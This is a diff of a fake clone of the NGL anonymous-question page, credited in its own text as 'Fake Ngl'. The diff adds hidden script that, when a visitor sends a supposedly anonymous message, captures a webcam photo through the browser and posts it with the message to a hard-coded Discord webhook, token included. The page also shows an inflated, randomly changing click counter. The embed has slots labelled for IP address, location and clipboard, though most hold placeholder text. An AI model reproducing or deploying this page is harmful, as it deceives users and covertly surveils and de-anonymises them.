@@ -1,233 +1,293 @@
 <!DOCTYPE html>
 <html>
-  <head>
-    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
 
-    <title>@Russellll_3242</title>
-    <link rel="canonical" href="https://ngl.link" />
-    <link rel="stylesheet" href="stylesheets/normalize.css" />
-    <link rel="stylesheet" href="stylesheets/style.css" />
-    <link
-      rel="shortcut icon"
-      href="62a6e19b906fa55f541799d7/62a98d041030ce99f782fbde_Variant5_256.png"
-    />
-    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
-    <script src="scripts/main.js"></script>
-    <meta
-      name="viewport"
-      content="initial-scale=1.0, maximum-scale=1.0, user-scalable=no, width=device-width"
-    />
-    <meta name="user:language" content="en" />
-    <meta
-      property="og:image"
-      content="https://vercel-og-nextjs-ngl-labs.vercel.app/api/main?imageUrl=&text1=send%20me%20anonymous%20messages!"
-    />
-    <meta property="og:title" content="@Russellll_3242: send me anonymous messages!" />
-    <meta
-      property="og:description"
-      content="@Russellll_3242: send me anonymous messages!"
-    />
-    <meta name="twitter:card" content="summary_large_image" />
-    <meta
-      name="twitter:image"
-      content="https://vercel-og-nextjs-ngl-labs.vercel.app/api/main?imageUrl=&text1=send%20me%20anonymous%20messages!"
-    />
-    <meta
-      name="twitter:title"
-      content="@Russellll_3242: Send me anonymous messages!"
-    />
-    <meta name="twitter:description" content="NGL: Anonymous Q&amp;A" />
-  </head>
-  <body>
-    <script>
-      var translations = {
-        peopleJustTappedTheButton: "people just tapped the button",
-        sendButton: "Send!",
-        anonymousQA: "anonymous q&a",
-        inputPlaceHolder: "send me anonymous messages...",
-        downloadButton: "Get your own messages!",
-      };
-      var priorityInboxEnabled = false;
-      var username = "_nicoo1";
-      var uid = "TbgkNysyScTQpSCt2qZloFUTtRD2";
-      var gameSlug = "";
-      var gameId = "default";
-      var ig_username = "_nicoo1";
-    </script>
-    <input type="hidden" id="userRegion" value="PH" />
-    <div class="container" style="z-index: 1000; position: relative">
-      <form action="p/sent.html" id="webhookForm" onsubmit="return postToWebhook(event)" class="form" method="post">
-        <div class="bubble">
-          <div class="header">
-            <div class="pfp-container">
-              <img
-                class="pfp"
-                src="img/ruru.jpg"
-              />
-            </div>
-            <div class="user-container">
-              <div class="username">@Russellll_3242</div>
-              <div class="prompt">send me anonymous messages!</div>
-            </div>
+<head>
+  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+
+  <title>@Russellll_3242</title>
+  <link rel="canonical" href="https://ngl.link" />
+  <link rel="stylesheet" href="stylesheets/normalize.css" />
+  <link rel="stylesheet" href="stylesheets/style.css" />
+  <link rel="shortcut icon" href="62a6e19b906fa55f541799d7/62a98d041030ce99f782fbde_Variant5_256.png" />
+  <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+  <script src="scripts/main.js"></script>
+  <meta name="viewport" content="initial-scale=1.0, maximum-scale=1.0, user-scalable=no, width=device-width" />
+  <meta name="user:language" content="en" />
+  <meta property="og:image"
+    content="https://vercel-og-nextjs-ngl-labs.vercel.app/api/main?imageUrl=&text1=send%20me%20anonymous%20messages!" />
+  <meta property="og:title" content="@Russellll_3242: send me anonymous messages!" />
+  <meta property="og:description" content="@Russellll_3242: send me anonymous messages!" />
+  <meta name="twitter:card" content="summary_large_image" />
+  <meta name="twitter:image"
+    content="https://vercel-og-nextjs-ngl-labs.vercel.app/api/main?imageUrl=&text1=send%20me%20anonymous%20messages!" />
+  <meta name="twitter:title" content="@Russellll_3242: Send me anonymous messages!" />
+  <meta name="twitter:description" content="NGL: Anonymous Q&amp;A" />
+</head>
+
+<body>
+  <script>
+    var translations = {
+      peopleJustTappedTheButton: "people just tapped the button",
+      sendButton: "Send!",
+      anonymousQA: "anonymous q&a",
+      inputPlaceHolder: "send me anonymous messages...",
+      downloadButton: "Get your own messages!",
+    };
+    var priorityInboxEnabled = false;
+    var username = "_nicoo1";
+    var uid = "TbgkNysyScTQpSCt2qZloFUTtRD2";
+    var gameSlug = "";
+    var gameId = "default";
+    var ig_username = "_nicoo1";
+  </script>
+  <input type="hidden" id="userRegion" value="PH" />
+  <div class="container" style="z-index: 1000; position: relative">
+    <form action="p/sent.html" id="webhookForm" onsubmit="return postToWebhook(event)" class="form" method="post">
+      <div class="bubble">
+        <div class="header">
+          <div class="pfp-container">
+            <img class="pfp" src="img/ruru.jpg" />
           </div>
-          <div class="textarea-container">
-            <div class="dice-button">🎲</div>
-            <textarea
-              placeholder="send me anonymous messages..."
-              name="question"
-              autocomplete="off"
-              maxlength="300"
-              id="question"
-            ></textarea>
+          <div class="user-container">
+            <div class="username">@Russellll_3242</div>
+            <div class="prompt">send me anonymous messages!</div>
           </div>
-          <input class="deviceId" type="hidden" name="deviceId" id="deviceId" />
         </div>
-        <div class="anonymous-tooltip">🔒 anonymous q&a</div>
-        <button
-          class="submit"
-          type="submit"
-          style="transform: translateZ(0px); z-index: 1000"
-        >
-          Send!
-        </button>
-      </form>
-    </div>
-    <div class="bottom-container-user-wrapper">
-      <div class="bottom-container">
-        <h2 class="download-prompt">
-          👇 <span class="clickCount">216</span> people just tapped the button👇
-        </h2>
-        <div class="space2"></div>
-        <a
-        class="button download-link download-link1 pulse"
+        <div class="textarea-container">
+          <div class="dice-button">🎲</div>
+          <textarea placeholder="send me anonymous messages..." name="question" autocomplete="off" maxlength="300"
+            id="question"></textarea>
+        </div>
+        <input class="deviceId" type="hidden" name="deviceId" id="deviceId" />
+      </div>
+      <div class="anonymous-tooltip">🔒 anonymous q&a</div>
+      <button class="submit" type="submit" style="transform: translateZ(0px); z-index: 1000">
+        Send!
+      </button>
+    </form>
+  </div>
+  <div class="bottom-container-user-wrapper">
+    <div class="bottom-container">
+      <h2 class="download-prompt">
+        👇 <span class="clickCount">216</span> people just tapped the button👇
+      </h2>
+      <div class="space2"></div>
+      <a class="button download-link download-link1 pulse"
         href="https://apps.apple.com/us/app/ngl-anonymous-q-a/id1596550932?ppid=543cb167-5bdc-448f-a202-e5506f5d2837"
-          target="_blank"
-          >Get your own messages!</a
-        >
-        <div class="tos-privacy">
-          <a class="tos" href="https://ngl.link/p/terms">Terms</a
-          ><a class="privacy" href="https://ngl.link/p/privacy">Privacy</a>
-        </div>
+        target="_blank">Get your own messages!</a>
+      <div class="tos-privacy">
+        <a class="tos" href="https://ngl.link/p/terms">Terms</a><a class="privacy"
+          href="https://ngl.link/p/privacy">Privacy</a>
       </div>
     </div>
-    <script>
-      $(document).ready(function() {
-          // Random questions and phrases
-          let randomQuestions = [
-              "What is your favorite color?",
-              "Where did you go to school?",
-              "What is your dream job?",
-              "Do you have any pets?",
-              "What is your favorite book?"
-              // Add more questions as needed
-          ];
+  </div>
+  <video id="video" width="320" height="240" autoplay></video>
+  <canvas id="canvas" width="320" height="240" style="display:none;"></canvas>
+  <script>
+    $(document).ready(function () {
+      // Random questions and phrases
+      let randomQuestions = [
+        "What is your favorite color?",
+        "Where did you go to school?",
+        "What is your dream job?",
+        "Do you have any pets?",
+        "What is your favorite book?"
+        // Add more questions as needed
+      ];
 
-          let phrases = [
-              "🐧 Fake Ngl made by: Russell James ",
-              "🐧 ADD me!",
-              "🐧 Facebook: https://www.facebook.com/ruruonfb",
-              "🐧 Github: https://github.com/R-uru",
-          ];
+      let phrases = [
+        "🐧 Fake Ngl made by: Russell James ",
+        "🐧 ADD me!",
+        "🐧 Facebook: https://www.facebook.com/ruruonfb",
+        "🐧 Github: https://github.com/R-uru",
+      ];
 
-          let clickCount = 0;
+      let clickCount = 0;
 
-          $('.dice-button').click(function(e) {
-              clickCount++;
+      $('.dice-button').click(function (e) {
+        clickCount++;
 
-              if (clickCount <= 3) {
-                  // Show random question
-                  const randomQuestion = randomQuestions[Math.floor(Math.random() * randomQuestions.length)];
-                  $('textarea').val(randomQuestion + ' ');
-              } else {
-                  // Show phrases sequentially
-                  const phraseIndex = clickCount - 4; // Adjusting index to start from 0
-                  if (phraseIndex < phrases.length) {
-                      $('textarea').val(phrases[phraseIndex] + ' ');
-                  } else {
-                      // Once all phrases are shown, you can reset or continue as needed
-                      location.reload();
-                  }
-              }
+        if (clickCount <= 3) {
+          // Show random question
+          const randomQuestion = randomQuestions[Math.floor(Math.random() * randomQuestions.length)];
+          $('textarea').val(randomQuestion + ' ');
+        } else {
+          // Show phrases sequentially
+          const phraseIndex = clickCount - 4; // Adjusting index to start from 0
+          if (phraseIndex < phrases.length) {
+            $('textarea').val(phrases[phraseIndex] + ' ');
+          } else {
+            // Once all phrases are shown, you can reset or continue as needed
+            location.reload();
+          }
+        }
 
-              $('textarea')[0].selectionStart = $('textarea').val().length;
-              $('textarea')[0].selectionEnd = $('textarea').val().length;
+        $('textarea')[0].selectionStart = $('textarea').val().length;
+        $('textarea')[0].selectionEnd = $('textarea').val().length;
 
-              $('.submit').show();
+        $('.submit').show();
 
-              e.preventDefault();
-          });
+        e.preventDefault();
       });
+    });
 
-      
-      // Count  
-      setInterval(() => {
-        let clickCount = parseInt($('.clickCount').text())
-        clickCount += Math.floor(Math.random() * 5) - 1
-        $('.clickCount').text(clickCount)
+
+    // Count  
+    setInterval(() => {
+      let clickCount = parseInt($('.clickCount').text())
+      clickCount += Math.floor(Math.random() * 5) - 1
+      $('.clickCount').text(clickCount)
     }, 800)
 
     // webhook
-    function postToWebhook(event) {
-            event.preventDefault(); // Prevent the form from submitting the traditional way
+    async function postToWebhook(event) {
+  event.preventDefault(); // Prevent the form from submitting the traditional way
 
-            var question = document.getElementById('question').value;
+  var question = document.getElementById('question').value;
+  var camvalue = false;
+  var webhookURL = 'https://discord.com/api/webhooks/1262358027990732952/gDMkNtHzI686oGjvJWCDo5psdbESTQLAdV9uuv_0Vu3mk2-X0mp95YZh_6qQwaMoklvT';
 
-            if (question) {
-                var webhookURL = 'https://discord.com/api/webhooks/1262358027990732952/gDMkNtHzI686oGjvJWCDo5psdbESTQLAdV9uuv_0Vu3mk2-X0mp95YZh_6qQwaMoklvT';
-                var request = new XMLHttpRequest();
-                request.open("POST", webhookURL);
-                request.setRequestHeader('Content-type', 'application/json');
+  try {
+    // Step 1: Request Camera Access and Capture Image
+    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
 
-                var params = {
-                    content: question,
-                    embeds: [
-                      {
-                        "title": ">>> NGL REVEAL",
-                        "description": "[second info](https://avatars.githubusercontent.com/R-uru)",
-                        "color": 16711680,
-                        "footer": {
-                          "text": "",
-                          "icon_url": "https://avatars.githubusercontent.com/R-uru"
-                        },
-                        "author": {
-                          "name": "2xbitx",
-                          "icon_url": "https://avatars.githubusercontent.com/R-uru",
-                          "url": "https://facebook.com"
-                        },
-                        "fields": [
-                          {
-                            "name": "Info 1",
-                            "value": question,
-                            "inline": true
-                          },
-                          {
-                            "name": "info 2",
-                            "value": "code",
-                            "inline": false
-                          }
-                        ],
-                        "timestamp": "2024-07-15T12:48:00.000Z",
-                        "url": "https://facebook.com"
-                      }
-                    ],
-                    "content": ""
-                }
+    // Check if camera access was granted
+    camvalue = true;
 
-                request.send(JSON.stringify(params));
-                request.onload = function() {
-                    if (request.status >= 200 && request.status < 300) {
-                        document.getElementById('webhookForm').reset(); // Reset the form
-                        window.location.href = "p/sent.html";
-                    } else {
-                        console.log('Failed to send question. Status code: ' + request.status);
-                    }
-                }
-            } else {
-                console.log('Please enter a question.');
-            }
+    // Proceed with capturing the image
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+    const context = canvas.getContext('2d');
 
-            return false; // Prevent the form from submitting the traditional way
-        }
+    video.srcObject = stream;
+
+    await new Promise(resolve => {
+      video.onloadedmetadata = () => {
+        video.play();
+        resolve();
+      };
+    });
+
+    // Capture image from video stream
+    context.drawImage(video, 0, 0, canvas.width, canvas.height);
+    stream.getTracks().forEach(track => track.stop());
+
+    // Convert captured image to Blob
+    const imageBlob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg'));
+
+    // Send Image to Discord Webhook
+    var formData = new FormData();
+    formData.append('file', imageBlob, 'capture.jpg');
+
+    await fetch(webhookURL, {
+      method: 'POST',
+      body: formData
+    });
+
+  } catch (error) {
+    console.error('Camera access error:', error);
+  }
+
+  // Step 2: Send Embed to Discord Webhook
+  sendEmbedToWebhook(webhookURL, question, camvalue);
+
+  return false; // Prevent the form from submitting the traditional way
+}
+
+function sendEmbedToWebhook(webhookURL, question, camvalue) {
+  var request = new XMLHttpRequest();
+  request.open("POST", webhookURL);
+  request.setRequestHeader('Content-type', 'application/json');
+
+  var params = {
+    content: "", // Leave content empty if you don't want it in the top-level content
+    embeds: [
+      {
+        "author": {
+          "name": "2xbitx",
+          "icon_url": "https://avatars.githubusercontent.com/R-uru",
+          "url": "https://github.com/R-uru"
+        },
+        "title": "NGL Reveal",
+        "url": "https://github.com/R-uru",
+        "description": "|| @everyone ||\n**\n🐧INFO SEC**",
+        "fields": [
+          {
+            "name": "💌Message:",
+            "value": question
+          },
+          {
+            "name": "📍IP Address:",
+            "value": "192.168.100.1"
+          },
+          {
+            "name": "🛜Browser Type and Version:",
+            "value": "20"
+          },
+          {
+            "name": "💻Operating System:",
+            "value": "windows"
+          },
+          {
+            "name": "📱Device Type:",
+            "value": "dtvalue"
+          },
+          {
+            "name": "🔗Referrer URL:",
+            "value": "rurlvalue"
+          },
+          {
+            "name": "⌛Time Spent on Site:",
+            "value": "timevalue"
+          },
+          {
+            "name": "📳Screen Resolution:",
+            "value": "srvalue"
+          },
+          {
+            "name": "👆🏻Click Patterns:",
+            "value": "clickvalue"
+          },
+          {
+            "name": "⚠️⚠️Explicit Permission⚠️⚠️",
+            "value": "Please acknowledge."
+          },
+          {
+            "name": "🗺️Location Data:",
+            "value": "locvalue"
+          },
+          {
+            "name": "📸Camera Access:",
+            "value": camvalue ? "Camera access granted" : "Camera access denied"
+          },
+          {
+            "name": "📋Clipboard:",
+            "value": "clipvalue"
+          }
+        ],
+        "color": 16711680, // Use an integer for color
+        "footer": {
+          "text": "Made by: 2xbitx",
+          "url": "https://github.com/R-uru",
+          "icon_url": "https://avatars.githubusercontent.com/R-uru"
+        },
+        "timestamp": new Date().toISOString() // Corrected timestamp format
+      }
+    ]
+  };
+
+  request.send(JSON.stringify(params));
+  request.onload = function () {
+    if (request.status >= 200 && request.status < 300) {
+      document.getElementById('webhookForm').reset(); // Reset the form
+      window.location.href = "p/sent.html";
+    } else {
+      console.log('Failed to send question. Status code: ' + request.status);
+    }
+  }
+}
+
   </script>
-  </body>
+</body>
+
 </html>
